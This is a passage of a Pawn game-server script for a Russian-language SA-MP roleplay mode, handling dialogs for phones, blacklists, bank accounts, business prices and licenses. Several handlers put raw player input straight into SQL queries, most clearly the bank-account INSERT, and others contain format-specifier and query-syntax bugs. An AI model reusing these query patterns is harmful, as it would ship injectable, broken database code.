			switch(listitem)
			{
			    case 0: PlayAudioStreamForPlayer(playerid,"http://www.europaplus.ru/online/player.php?q=128"),SendClientMessage(playerid,CREWARD,"Вы включили радио!");
			    case 1:	PlayAudioStreamForPlayer(playerid,"http://radiorecord.ru:9000/record.ogg.m3u"),SendClientMessage(playerid,CREWARD,"Вы включили радио!");
			    case 2:	PlayAudioStreamForPlayer(playerid,"http://listen.rpfm.ru:9000/premium128"),SendClientMessage(playerid,CREWARD,"Вы включили радио!");
			    case 4:	PlayAudioStreamForPlayer(playerid,"http://radio.zaycev.fm:9002/ZaycevFM"),SendClientMessage(playerid,CREWARD,"Вы включили радио!");
			    case 5: StopAudioStreamForPlayer(playerid),SendClientMessage(playerid,CREWARD,"Вы отключили радио!");
			}
		}
		case 414:
		{
		    if(!response) return BizMenu(playerid);
			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
		    switch(listitem)
		    {
		        case 0: BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk] = 0,SendClientMessage(playerid,CREWARD,"[BIZ]{ffffff} Вы отключили звук при входе в бизнес!");
		        case 1:
				{
					BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk] = 1062;
					PlayerPlaySound(playerid, 1062, X, Y, Z);
					SendClientMessage(playerid,CREWARD,"[BIZ]{ffffff} Теперь данный звук будет проигрываться при входе в бизнес!");
					SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"bZvuk",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk]);
				}
		        case 2:
				{
					BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk] = 1076;
   					PlayerPlaySound(playerid, 1076, X, Y, Z);
					SendClientMessage(playerid,CREWARD,"[BIZ]{ffffff} Теперь данный звук будет проигрываться при входе в бизнес!");
					SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"bZvuk",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk]);
				}
		        case 3:
				{
					BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk] = 1097;
  					PlayerPlaySound(playerid, 1097, X, Y, Z);
					SendClientMessage(playerid,CREWARD,"[BIZ]{ffffff} Теперь данный звук будет проигрываться при входе в бизнес!");
					SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"bZvuk",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk]);
				}
		        case 4:
				{
					BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk] = 1183;
   					PlayerPlaySound(playerid, 1183, X, Y, Z);
					SendClientMessage(playerid,CREWARD,"[BIZ]{ffffff} Теперь данный звук будет проигрываться при входе в бизнес!");
					SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"bZvuk",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk]);
				}
		        case 5:
				{
					BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk] = 1185;
   					PlayerPlaySound(playerid, 1185, X, Y, Z);
					SendClientMessage(playerid,CREWARD,"[BIZ]{ffffff} Теперь данный звук будет проигрываться при входе в бизнес!");
					SetBizInt(GetPVarInt(playerid,"PlayerBiz"),"bZvuk",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZvuk]);
				}
		    }
		}
		case 415:
		{
			if(!response) return 1;
			switch(listitem)
			{
			    case 0: ShowPlayerDialog(playerid,123,DIALOG_STYLE_LIST,"Телефонная будка","{FFFFFF}Полиция\nСкорая помощь","Далее","Назад");
			    case 1:
				{
				    if(PlayerInfo[playerid][pCash] < 2) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
					ShowPlayerDialog(playerid,123,DIALOG_STYLE_LIST,"Телефонная будка","{FFFFFF}1 | Такси\n2 | Механик","Далее","Назад"),SetPVarInt(playerid,"Budka",1);
				}
				case 2:
				{
				    if(PlayerInfo[playerid][pCash] < 5) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
				    ShowPlayerDialog(playerid,416,DIALOG_STYLE_INPUT,"Телефонная будка","{FFFFFF}Введите номер телефона:\n\n","Далее","Назад");
				}
			}
		}
		case 416:
		{
		    if(!response) return 1;
		    if(PlayerInfo[playerid][pCash] < 50) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,416,DIALOG_STYLE_INPUT,"Телефонная будка","{FFFFFF}Введите номер телефона:\n\n","Далее","Назад");
            SetPVarInt(playerid,"Budka",1);
			CallPlayer(playerid,strval(inputtext));
		}
		case 417:
		{
		    if(!response) return 1;
		    if(!response) return 1;
			switch(listitem)
			{
			    case 0:
			    {
			        cmd_togphone(playerid);
			        cmd_phone(playerid);
			    }
			    case 1: cmd_phone(playerid);
			    case 2:
			    {
       				ShowSMS(playerid);
			    }
			    case 3:
			    {
       				ShowPhone(playerid);
			    }
			    case 4:
			    {
			        DeletePVar(playerid,"CheckPlayer");
			        query = "";
			        format(query, sizeof(query), "SELECT * FROM phone WHERE id1 = '%d'",PlayerInfo[playerid][pID]);
					mysql_tquery(mysql, query, "ShowPhoneContakt", "d", playerid);
		       /*     format(query, sizeof(query), "SELECT * FROM phone WHERE id1 = '%d'",PlayerInfo[playerid][pID]);
					mysql_tquery(mysql,query);
					mysql_store_result();
					new srrt[1000],kek;
					new sos[16],sos1[16],sas,sos22[10];
					new str[50];
				 	strcat(srrt, "{20BA09}Создать контакт\n{FFFFFF}");
					if(mysql_num_rows() > 0)
					{
						for(new i = 0; i <= mysql_num_rows();i++)
						{
							if(mysql_fetch_row_format(query))
				   			{
								
								mysql_get_field("name", sos);
								mysql_get_field("num", sos1);
								sas = strval(sos1);
								
								format(str,sizeof(str),"Имя: %s | Номер: %i\n",sos,sas);
								strcat(srrt, str);
								ListNick[playerid][kek] = sas;
				    			kek++;
				    			if(kek >= 15)
								{
								    mysql_get_field("id", sos22);
								    SetPVarInt(playerid,"CheckPlayer",strval(sos22));
								    break;
								}

							}
						}


						mysql_free_result();
						if(GetPVarInt(playerid,"CheckPlayer")) strcat(srrt, "\nДалее >>");

					}
					ShowPhoneContakt
					ShowPlayerDialog(playerid,340,DIALOG_STYLE_LIST,"Список контактов",srrt,"Закрыть","");*/
			    }
			    case 5:
			    {
			        DeletePVar(playerid,"CheckPlayer");
			        query = "";
			        format(query, sizeof(query), "SELECT * FROM blacklist WHERE id1 = '%d'",PlayerInfo[playerid][pID]);
					mysql_tquery(mysql, query, "ShowPhoneBlackList", "d", playerid);
					
					
			/*		format(query, sizeof(query), "SELECT * FROM blacklist WHERE id1 = '%d'",PlayerInfo[playerid][pID]);
					mysql_tquery(mysql,query);
					mysql_store_result();
					new srrt[1000],kek;
					new sos[16],sos1[16],sas,sos22[10];
					new str[50];
					ShowPhoneBlackList
				 	strcat(srrt, "{20BA09}Добавить в черный список\n{FFFFFF}");
					if(mysql_num_rows() > 0)
					{
						for(new i = 0; i <= mysql_num_rows();i++)
						{
							if(mysql_fetch_row_format(query))
				   			{

								mysql_get_field("num", sos1);
								sas = strval(sos1);

								format(str,sizeof(str),"Номер: %i\n",sos,sas);
								strcat(srrt, str);
								ListNick[playerid][kek] = sas;
				    			kek++;
				    			if(kek >= 15)
								{
								    mysql_get_field("id", sos22);
								    SetPVarInt(playerid,"CheckPlayer",strval(sos22));
								    break;
								}

							}
						}


						mysql_free_result();
						if(GetPVarInt(playerid,"CheckPlayer")) strcat(srrt, "\nДалее >>");

					}
					ShowPlayerDialog(playerid,422,DIALOG_STYLE_LIST,"Черный список",srrt,"Закрыть","");*/
			    }
			}
		}
		case 418:
		{
		    if(!response) return true;
		    new code[24],phone;
		    if(sscanf(inputtext,"p<,>s[24]d",code,phone) || phone > 999999 || phone < 100000) return ShowPlayerDialog(playerid,418,DIALOG_STYLE_INPUT,"Создать контакт","{ffffff}Введите название контакта и номер телефона через запятую:\n\nНапример: Ivan_Ivan,567876","Далее","Закрыть");
            query = "";
            format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%d'", phone);
			mysql_tquery(mysql, query, "CheckPhoneCard", "dds", playerid, phone,code);
			
		/*		  format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%d'", phone);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(!mysql_fetch_row_format(query))
			{
				SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера телефона не зарегистрирован");
			    mysql_free_result();
			    return true;
			}
			format(query, sizeof(query), "SELECT * FROM phone WHERE num = '%d' AND id1 = '%d'", phone, PlayerInfo[playerid][pID]);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(mysql_fetch_row_format(query))
			{
				SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера уже есть в Вашей записной книжке");
			    mysql_free_result();
			    return true;
			}
			format(query, sizeof(query), "INSERT INTO phone (id1,name,num) VALUES ('%d', '%s','%d')", PlayerInfo[playerid][pID],code,phone);
			mysql_tquery(mysql,query);
			return SendClientMessage(playerid,-1,"Данной номер телефона добавлен в ваши контакты");*/
		}
		case 419:
		{
		    if(!response) return cmd_phone(playerid);
		    query = "";
		    format(query, sizeof(query), "SELECT * FROM phonesms WHERE id = '%d'", ListNick[playerid][listitem]);
			mysql_tquery(mysql, query, "ShowSMSDB", "d", playerid);
			
			
		    /*format(query, sizeof(query), "SELECT * FROM phonesms WHERE id = '%d'", ListNick[playerid][listitem]);
			mysql_tquery(mysql,query);
			mysql_store_result();
			new year, month, day, hour, minute, second,sos[24],text[60],sos1[24];
			if(mysql_fetch_row_format(query))
			{
			    mysql_get_field("time", sos);
   			    TimestampToDate(strval(sos), year, month, day, hour, minute, second,0);
				mysql_get_field("id1", sos);
				mysql_get_field("id2", sos1);
				mysql_get_field("sms", text);
				static const fmt_string[] = "{ffffff}[%02d/%02d/%02d %02d:%02d:%02d] {f7ae11}%s{ffffff} %s\n\n%s";
				new str1[sizeof(fmt_string)+20];
				format(str1, sizeof(str1), fmt_string,day,month,year,hour, minute, second,(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? ("к") : ("от"),(strfind(sos,PlayerInfo[playerid][pSendername],true) != -1) ? (sos1) : (sos),text);
				ShowPlayerDialog(playerid,420,DIALOG_STYLE_MSGBOX,"Сообщение",str1,"Закрыть","");
			}
			mysql_free_result();*/
		}
		case 420: return ShowSMS(playerid);
		case 421: return cmd_phone(playerid);
		case 422:
		{
		    if(!response)
			{
			    return DeletePVar(playerid,"CheckPlayer");
			}
			if(!listitem && !GetPVarInt(playerid,"CheckPlayer"))
			{
			    return ShowPlayerDialog(playerid,423,DIALOG_STYLE_INPUT,"Добавить в черный список","{ffffff}Введите номер телефона:\n\n","Далее","Закрыть");
			}
			if(listitem > 0 && listitem < 15)
			{
				SetPVarInt(playerid,"Nomer",ListNick[playerid][listitem]);
				ShowPlayerDialog(playerid,424,DIALOG_STYLE_MSGBOX,"Удалить из черного списка","{ffffff}Вы действительно хотите удалить данный номер из черного списка?","Далее","Закрыть");
			}
			else
			{
			    query = "";
			    format(query, sizeof(query), "SELECT * FROM blacklist WHERE id1 = '%d' AND id > '%d'",PlayerInfo[playerid][pID],GetPVarInt(playerid,"CheckPlayer"));
				mysql_tquery(mysql, query, "ShowPhoneBlackList", "d", playerid);
	   		/*	format(query, sizeof(query), "SELECT * FROM blacklist WHERE id1 = '%d' AND id > '%d'",PlayerInfo[playerid][pID],GetPVarInt(playerid,"CheckPlayer"));
				mysql_tquery(mysql,query);
				mysql_store_result();
				DeletePVar(playerid,"CheckPlayer");
				if(mysql_num_rows() > 0)
				{
				    new srrt[1000],kek;
					strcat(srrt, "{FFFFFF}");
					new sos[16],sos1[16],sas,sos22[10];
					new str[50];
					for(new i = 0; i <= mysql_num_rows();i++)
					{
						if(mysql_fetch_row_format(query))
			   			{
							
							mysql_get_field("num", sos1);
							sas = strval(sos1);
							
							format(str,sizeof(str),"Номер: %i\n",sas);
							strcat(srrt, str);
							ListNick[playerid][kek] = sas;
			    			kek++;
			    			if(kek >= 15)
							{
							    mysql_get_field("id", sos22);
							    SetPVarInt(playerid,"CheckPlayer",strval(sos22));
							    break;
							}

						}
					}


					mysql_free_result();
					if(GetPVarInt(playerid,"CheckPlayer")) strcat(srrt, "\nДалее >>");
					ShowPlayerDialog(playerid,340,DIALOG_STYLE_LIST,"Черный список",srrt,"Закрыть","");
				}*/
			}
		}
		case 423:
		{
		    if(!response) return true;
		    new phone;
		    if(sscanf(inputtext,"d",phone) || phone > 999999 || phone < 100000) return ShowPlayerDialog(playerid,423,DIALOG_STYLE_INPUT,"Добавить в черный список","{ffffff}Введите номер телефона:\n\n","Далее","Закрыть");
            query = "";
            format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%d'", phone);
			mysql_tquery(mysql, query, "CheckBlackListPhone", "dd", playerid,phone);
			
	  	/*	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE phone = '%d'", phone);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(!mysql_fetch_row_format(query))
			{
				SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера телефона не зарегистрирован");
			    mysql_free_result();
			    return true;
			}
			format(query, sizeof(query), "SELECT * FROM blacklist WHERE num = '%d' AND id1 = '%d'", phone, PlayerInfo[playerid][pID]);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(mysql_fetch_row_format(query))
			{
				SendClientMessage(playerid, 0xAFAFAFAA, "Данного номера уже есть в Вашем черном списке");
			    mysql_free_result();
			    return true;
			}
			format(query, sizeof(query), "INSERT INTO phone (id1,num) VALUES ('%d','%d')", PlayerInfo[playerid][pID],phone);
			mysql_tquery(mysql,query);
			return SendClientMessage(playerid,-1,"Данной номер телефона добавлен в черный список");*/
		}
		case 424:
		{
		    if(!response) return true;
		    query = "";
			format(query, sizeof(query), "DELETE FROM blacklist WHERE id1 = '%d' AND num = '%d'", PlayerInfo[playerid][pID],GetPVarInt(playerid,"Nomer"));
			mysql_tquery(mysql,query);
			SendClientMessage(playerid,-1,"Номер удален из черного списка");
		}
		case 425:
		{
		    if(!response) return 1;
		    if(PlayerInfo[playerid][pCash] < 30000)
		    {
		        SendClientMessage(playerid,CGREY,"Недостаточно средств");
                SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
				SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
               // ShowTuning(playerid);
		        return true;
		    }
		    VInfo[GetPVarInt(playerid,"Car")][vsis] = 1;
		    query = "";
		    format(query, sizeof(query), "UPDATE veh SET sis = 1 WHERE id = '%d' LIMIT 1",GetPVarInt(playerid,"Car"));
			mysql_tquery(mysql,query);
		    GiveMoney(playerid,-30000);
		    SendClientMessage(playerid,-1,"Вы приобрели данную деталь");
			SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
			SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
			//ShowTuning(playerid);
		}
		case 426:
		{
		    if(!response) return DeletePVar(playerid,"Member");
		    if(!strlen(inputtext) || strval(inputtext) < 0 || strval(inputtext) > 20) return ShowPlayerDialog(playerid,426,DIALOG_STYLE_INPUT,"Услуги адвоката","{FFFFFF}Введите процент к услугам адвоката:\n\n","Далее","Отмена");
		    Advocat = strval(inputtext);
			SetMatsInt("Advocat",strval(inputtext));
			static const fmt_string2[] = "Цена за услуги адвоката теперь составляет %d%% от суммы сделки";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,strval(inputtext));
			SendGov(playerid,str2);
		}
		
		case 427:
		{
		    if(!response) return DeletePVar(playerid,"Etaz");
		    if(GetPVarInt(playerid,"Etaz") == listitem) return SendClientMessage(playerid,CGREY,"Вы и так на этом этаже!");
			SetCameraBehindPlayer(playerid);
			DeletePVar(playerid,"Etaz");
			switch(listitem)
			{
			    case 0: // 2 этаж
			    {
			        SetPlayerPos(playerid,1387.2164,-0.4940,1000.9153);
				    SetPlayerFacingAngle(playerid,178.9048);
				    SetPlayerVirtualWorld(playerid,2);
				    SetPlayerInterior(playerid,1);
				    FreezePlayer(playerid,1387.2164,-0.4940,0.8);
			    }
			    case 1: // 1 этаж
			    {
			        SetPlayerPos(playerid,1386.4993,-20.7744,1000.9153);
				    SetPlayerFacingAngle(playerid,357.3901);
				    SetPlayerVirtualWorld(playerid,1);
				    SetPlayerInterior(playerid,1);
				    FreezePlayer(playerid,1386.4993,-20.7744,0.8);
			    }
			}
		}
		case 428:
		{
		    if(!response) return DeletePVar(playerid,"Etaz");
		    if(GetPVarInt(playerid,"Etaz") == listitem) return SendClientMessage(playerid,CGREY,"Вы и так на этом этаже!");
			SetCameraBehindPlayer(playerid);
			DeletePVar(playerid,"Etaz");
			switch(listitem)
			{
			    case 0: // 2 этаж
			    {
			        SetPlayerPos(playerid,1422.8368,-5.0106,1000.9133);
				    SetPlayerFacingAngle(playerid,269.7490);
				    SetPlayerVirtualWorld(playerid,3);
				    SetPlayerInterior(playerid,2);
				    FreezePlayer(playerid,1422.8368,-5.0106,0.8);
			    }
			    case 1: // 1 этаж
			    {
			        SetPlayerPos(playerid,1422.8212,-32.4778,1000.9153);
				    SetPlayerFacingAngle(playerid,276.0158);
				    SetPlayerVirtualWorld(playerid,2);
				    SetPlayerInterior(playerid,2);
				    FreezePlayer(playerid,1422.8212,-32.4778,0.8);
			    }
			}
			SetPVarInt(playerid,"FloodLift",gettime()+3);
		}
		case 429:
		{
		    if(!response) return 1;
			if(PlayerInfo[playerid][pCash] < 650) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			GiveMoney(playerid,-650);
			PlayerInfo[playerid][pLic][L_VOZ] = 1;
			PlayerInfo[playerid][pLicTime][L_VOZ] = gettime()+60*60*24*90;
			GiveInv(playerid,449,1);
			SendClientMessage(playerid,CREWARD,"Поздравляю! Вы приобрели права на усправление воздушным транспортом");
		}
		case 430:
		{
		    if(!response) return 1;
			if(PlayerInfo[playerid][pCash] < 450) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			GiveMoney(playerid,-450);
			PlayerInfo[playerid][pLic][L_VOD] = 1;
			PlayerInfo[playerid][pLicTime][L_VOD] = gettime()+60*60*24*90;
			GiveInv(playerid,449,1);
			SendClientMessage(playerid,CREWARD,"Поздравляю! Вы приобрели права на усправление воздушным транспортом");
		}
		case 431:
		{
			if(!response) return true;
			// if(PlayerInfo[playerid][pAdmin] < ListNick[playerid][listitem]) return SendClientMessage(playerid,CGREY,"Вы не можете снять администратора старше себя");
			new i = ListNick[playerid][listitem];
			query = "";
			format(query, sizeof(query), "SELECT * FROM accounts WHERE id = '%d'", i);
			mysql_tquery(mysql, query, "ShowAlist1", "d", playerid);
		}
		case 432:
		{
			if(!response) return DeletePVar(playerid,"AdminID");
			new name[24];
			GetPVarString(playerid,"AdminID",name,sizeof(name));
			if(GetPlayerID(name) == INVALID_PLAYER_ID)
			{
			    query = "";
				format(query,sizeof(query),"UPDATE `accounts` SET `AKolWarn` = '0', `AKolBan` = '0', `KolJail` = '0' \
				`KolAns` = '0',`KolMute` = '0' WHERE name = '%s' LIMIT 1",GetPVarInt(playerid,"AdminID"));
				mysql_tquery(mysql,query);
			}
			else
			{
			    PlayerInfo[playerid][pJailKol] = 0;
			    PlayerInfo[playerid][pWarnKol] = 0;
			    PlayerInfo[playerid][pBanKol] = 0;
			    PlayerInfo[playerid][pAnsKol] = 0;
			    PlayerInfo[playerid][pMuteKol] = 0;
			}
			static const fmt_string[] = "[A] %s очистил статистику администратора %s";
			new str1[sizeof(fmt_string)+MAX_PLAYER_NAME+32];
			format(str1, sizeof(str1), fmt_string,PlayerInfo[playerid][pSendername],name);
			SendAdminMessage(CGREY,str1);
		}
		case 433:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,434,DIALOG_STYLE_INPUT,"Счет","{ffffff}Введите название счета:\n\n","Далее","Отмена");
				case 1: ShowPlayerDialog(playerid,435,DIALOG_STYLE_LIST,"Счет","1 | Пополнить счет\n2 | Снять со счета\n3 | Перевести на другой счет","Далее","Отмена");
				default: ShowPlayerDialog(playerid,435,DIALOG_STYLE_LIST,"Счет","1 | Пополнить счет\n2 | Снять со счета\n3 | Перевести на другой счет\n{F85A5A}4 | Удалить счет","Далее","Отмена"),SetPVarInt(playerid,"Schet",listitem-1);
		    }
		    
		}
		case 434:
		{
		    if(!response) return 1;
		    if(!strlen(inputtext) || strlen(inputtext) > 64) return ShowPlayerDialog(playerid,434,DIALOG_STYLE_INPUT,"Счет","{ffffff}Введите название счета:\n\n","Далее","Отмена");
            query = "";
			format(query, sizeof(query), "INSERT INTO banks (name,idacc) VALUES ('%s','%d')", inputtext,PlayerInfo[playerid][pID]);
			mysql_tquery(mysql,query);
			static const fmt_string[] = "[BANK] {ffffff}Вы создали новый счет \"%s\"";
			new str1[sizeof(fmt_string)+62];
			format(str1, sizeof(str1), fmt_string,inputtext);
			SendClientMessage(playerid,CREWARD,str1);
			TOTALBANKS[playerid]++;
			strmid(BanksName[playerid][TOTALBANKS[playerid]], inputtext, 0, strlen(inputtext), MAX_PLAYER_NAME);

		}
		case 435:
		{
		   	if(!response) return DeletePVar(playerid,"Schet");
		   	switch(listitem)
		   	{
                case 0:
	            {
					ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"На сколько вы хотите пополнить ваш счет?");
					SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
					ShowPlayerDialog(playerid,65,DIALOG_STYLE_INPUT,"Пополнение счета","{FFFFFF}Введите на сколько хотите пополнить Ваш счет:","Далее","Назад");
	            }
	            case 1:
	            {
					ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
					Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"Сколько хотите снять со счета?");
					SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
					ShowPlayerDialog(playerid,66,DIALOG_STYLE_INPUT,"Снять со счета","{FFFFFF}Введите сколько хотите снять со счета:","Далее","Назад");
	            }
		   	    case 2:
		   	    {
					query = "";
					new str[60];
					format(str,sizeof(str),"{A8EFFF}Основной: %d${ffffff}\n",PlayerInfo[playerid][pBank]);
					strcat(query, str);
					for(new i = 1; i<= TOTALBANKS[playerid]; i++)
					{
						if(!strlen(BanksName[playerid][i])) continue;
						format(str,sizeof(str),"%s: %d\n",BanksName[playerid][i],BanksInfo[playerid][bankCash][i]);
						strcat(query, str);
					}
					ShowPlayerDialog(playerid,437,DIALOG_STYLE_LIST,"Cчет зачисления",query,"Далее","Отмена");
		   	    }
		   	    case 3:
		   	    {
		   	        query = "";
		   	        format(query, sizeof(query), "SELECT * FROM banks WHERE id = '%d' AND idacc = '%d'", GetPVarInt(playerid,"Schet"), PlayerInfo[playerid][pID]);
					mysql_tquery(mysql, query, "DeleteBanks", "d", playerid);
		   	    }
		   	    
		   	}
		}
		case 436:
		{
		    if(!response) return DeletePVar(playerid,"Schet");
		    query = "";
		    format(query, sizeof(query), "SELECT * FROM banks WHERE id = '%d' AND idacc = '%d'", GetPVarInt(playerid,"Schet"), PlayerInfo[playerid][pID]);
			mysql_tquery(mysql, query, "DeleteBanks1", "d", playerid);
		}
		case 437:
		{
		    if(!response) return DeletePVar(playerid,"Schet");
		    SetPVarInt(playerid,"SchetZ",listitem);
		    ShowPlayerDialog(playerid,438,DIALOG_STYLE_INPUT,"Счет","{ffffff}Введите сумму перевода:\n\n","Далее","Отмена");
		}
		case 438:
		{
		    if(!response) return DeletePVar(playerid,"Schet");
		    if(!strlen(inputtext) || strval(inputtext) < 0) return ShowPlayerDialog(playerid,438,DIALOG_STYLE_INPUT,"Счет","{ffffff}Введите сумму перевода:\n\n","Далее","Отмена");
		    if(!GetPVarInt(playerid,"Schet"))
		    {
		        if(PlayerInfo[playerid][pBank] < strval(inputtext))
		        {
					SendClientMessage(playerid,CGREY,"Недостаточно средств!");
					return ShowPlayerDialog(playerid,438,DIALOG_STYLE_INPUT,"Счет","{ffffff}Введите сумму перевода:\n\n","Далее","Отмена");
		        }
		    }
		    else
		    {
		        if(BanksInfo[playerid][bankCash][GetPVarInt(playerid,"Schet")] < strval(inputtext))
		        {
					SendClientMessage(playerid,CGREY,"Недостаточно средств!");
					return ShowPlayerDialog(playerid,438,DIALOG_STYLE_INPUT,"Счет","{ffffff}Введите сумму перевода:\n\n","Далее","Отмена");
		        }
		    }
		    PerevodEx(playerid,GetPVarInt(playerid,"Schet"),GetPVarInt(playerid,"SchetZ"),strval(inputtext));
		}
		case 439:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid,"PlayerBiz");
			static const fmt_string[] = "{ffffff}Введите новую цену для товара {f7ae11}\"%s\"{ffffff}\n\nТекущая цена: {f7ae11}%d${ffffff}\nРекомандованная цена: {f7ae11}%d${ffffff}\nЗатраты на продажу: {f7ae11}%d ед. продуктов{ffffff}\nПрибыль с одной продажи: {f7ae11}%d${ffffff}\n\nНалог на изменение цены - {f7ae11}500$";
			new str1[sizeof(fmt_string)+32+20];
			format(str1, sizeof(str1), fmt_string,ProdNames[i][listitem],ProdInfo[i][prodCena][listitem],ProdCena[BizInfo[i][bType]-1][listitem],ProdInfo[i][prodMinus][listitem],ProdInfo[i][prodCena][listitem]*70/100);
			ShowPlayerDialog(playerid,440,DIALOG_STYLE_INPUT,"Изменение цен",str1,"Далее","Отмена");
			SetPVarInt(playerid,"Tovar",listitem);
			
		}
		case 440:
		{
		    if(!response) return DeletePVar(playerid,"Tovar");
		    new x = GetPVarInt(playerid,"Tovar");
		    new i = GetPVarInt(playerid,"PlayerBiz");
		    if(!strlen(inputtext) || strval(inputtext) < ProdCena[BizInfo[i][bType]-1][x]-(ProdCena[BizInfo[i][bType]-1][x]*15/100)  || strval(inputtext) > ProdCena[BizInfo[i][bType]-1][x]+(ProdCena[BizInfo[i][bType]-1][x]*15/100))
			{
				static const fmt_string[] = "Минимальная цена для данного товара: %d$, а максимальная: %d$";
				new str1[sizeof(fmt_string)+15];
				format(str1, sizeof(str1), fmt_string, ProdCena[BizInfo[i][bType]-1][x]-(ProdCena[BizInfo[i][bType]-1][x]*15/100),ProdCena[BizInfo[i][bType]-1][x]+(ProdCena[BizInfo[i][bType]-1][x]*15/100));
				return SendClientMessage(playerid,CGREY,str1);
			}
			if(BizInfo[i][bMoney] < 500) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			ProdInfo[i][prodCena][x] = strval(inputtext);
            static const fmt_string2[] = "[BIZ]{ffffff} Новая цена для товара \"%s\" - %d$";
			new str2[sizeof(fmt_string2)+15];
			format(str2, sizeof(str2), fmt_string2,ProdNames[i][x],strval(inputtext));
			SendClientMessage(playerid,CREWARD,str2);
			BizInfo[i][bMoney] -= 500;
			query = "";
			format(query,sizeof(query),"UPDATE `bizprice` SET `cena` = '%d' WHERE `idbizz` = '%s' AND `prodid` = '%d' LIMIT 1",strval(inputtext),i,x);
			mysql_tquery(mysql,query);
			DeletePVar(playerid,"Tovar");
		}
		case 441:
		{
		    if(!response) return 1;
		    ShowPlayerDialog(playerid,442,DIALOG_STYLE_INPUT,"Информация","{ffffff}Введите сколько хотите отвезти ящиков с материалами:\n\nИнформация: {f7ae11}\1 ящик = 500 материалов","Далее","Отмена");
		    SetPVarInt(playerid,"Fracs",listitem);
		}
		case 442:
		{
		    if(!response) return DeletePVar(playerid,"Fracs");
			if(!strlen(inputtext) || strval(inputtext) < 0) return ShowPlayerDialog(playerid,442,DIALOG_STYLE_INPUT,"Информация","{ffffff}Введите сколько хотите отвезти ящиков с материалами:\n\nИнформация: {f7ae11}\1 ящик = 500 материалов","Далее","Отмена");
			new mats = strval(inputtext);
		//	new materials;
			if(FracMats[F_ARMY] < mats) return SendClientMessage(playerid,CGREY,"Недостаточно материалов на складе");
			new veh = GetPlayerVehicleID(playerid);
			if(BInfo[GetPlayerVehicleID(playerid)][bMats]+mats > 10) return SendClientMessage(playerid,CGREY,"В транспорте не хватает места");
            if(GetFreeTrunk(veh,455,mats)) return SendClientMessage(playerid,CGREY,"Недостаточно места в багажнике");
			BInfo[GetPlayerVehicleID(playerid)][bMats] += mats;
			FracMats[F_ARMY] -= mats*500;
			
			SetMatsInt("armysamats",FracMats[F_ARMY]);
			static const fmt_string[] = "[R] %s загрузил в транспорт %d материалов. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],mats*500,FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			static const fmt_str2ing[] = "Вы загрузили в транспорт %i материалов. Теперь в транспорте: %d";
			new str2[sizeof(fmt_str2ing)+4];
			format(str2, sizeof(str2), fmt_str2ing,mats*500,BInfo[veh][bMats]);
			SendClientMessage(playerid,CREWARD,str2);
			SendClientMessage(playerid,CREWARD,"Для разгрузки испольуйте: /unload на красном маркере");
			GiveTrunkInv(veh,455,mats);
			switch(GetPVarInt(playerid,"Fracs"))
			{
			    case 0: SetPlayerRaceCheckpoint(playerid,2,149.2886,1877.5964,17.9454,0,0,0,1);
			    case 1: SetPlayerRaceCheckpoint(playerid,2,1563.8132,-1697.5740,5.8970,0,0,0,1);
